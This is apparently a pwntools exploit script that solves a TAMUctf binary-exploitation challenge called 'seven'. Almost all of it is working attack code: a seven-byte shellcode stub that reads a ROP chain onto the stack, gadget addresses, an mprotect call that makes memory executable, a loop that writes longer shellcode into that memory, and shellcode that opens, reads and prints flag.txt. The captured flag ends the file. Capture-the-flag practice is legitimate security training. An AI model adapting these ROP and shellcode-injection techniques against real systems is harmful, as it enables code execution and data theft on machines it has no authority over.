from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./seven_patched', '''
    b *(main+118)
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")

# Trigger read(0, rsp, 0x500000) to read ROP chain into $rsp on the stack
seven_bytes_shellcode = asm('''
    xor edi, edi
    push rsp
    pop rsi
    syscall
    ret
''')
p.send(seven_bytes_shellcode)

# Find critical gadgets
POP_7_REGISTERS = 0x401362
MPROTECT = 0x403fe8
CALL_R12_ADD_RBX_MUL_8 = 0x401348
ADD_EBX_TO_DWORD_PTR_RBP_MINUS_3D = 0x401218

# Trigger mprotect(0x500000, 0x1000, 7) to make the 0x500000-0x501000 region executable
rop_payload = b''
rop_payload += p64(POP_7_REGISTERS) # pop 7 registers
rop_payload += p64(0) # rbx
rop_payload += p64(1) # rbp
rop_payload += p64(MPROTECT) # r12
rop_payload += p64(0x500000) # r13, edi later
rop_payload += p64(0x1000) # r14, rsi later
rop_payload += p64(0x7) # r15, rdx later
rop_payload += p64(CALL_R12_ADD_RBX_MUL_8) # call [r12+rbx*8]
rop_payload += p64(0xAAAAAAAA) # necessary trash due to add rsp, 0x8

# Read flag.txt and print it: push filename "flag.txt" to stack; call open("flag.txt", 0, 0); call read(fd, 0x500320, 128); call write(1, 0x500320, 128); call exit(0)
longer_shellcode = asm('''
    mov rsi, 0
    push rsi
    mov rsi, 0x7478742e67616c66
    push rsi

    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, 0x500320
    mov rdx, 128
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, 0x500320
    mov rdx, 128
    syscall

    mov rax, 60
    mov rdi, 0
    syscall
''')
longer_shellcode_payload = b''
pos = 0
while pos < len(longer_shellcode):
    part = longer_shellcode[pos:pos + 4]
    if pos != 0:
        longer_shellcode_payload += p64(POP_7_REGISTERS) # pop 7 registers
    longer_shellcode_payload += part.ljust(8, b'\x00') # rbx
    longer_shellcode_payload += p64(0x500007+pos+0x3d) # rbp
    longer_shellcode_payload += p64(0x0) # r12
    longer_shellcode_payload += p64(0x0) # r13, edi later
    longer_shellcode_payload += p64(0x0) # r14, rsi later
    longer_shellcode_payload += p64(0x0) # r15, rdx later
    longer_shellcode_payload += p64(ADD_EBX_TO_DWORD_PTR_RBP_MINUS_3D)  # add ebx to dword ptr [rbp - 0x3d]
    pos += 4
rop_payload += longer_shellcode_payload

# Jump to execute the longershellcode
rop_payload += p64(0x500007)

p.sendline(rop_payload)

p.interactive()

# gigem{my_challenge_names_are_so_creative_right}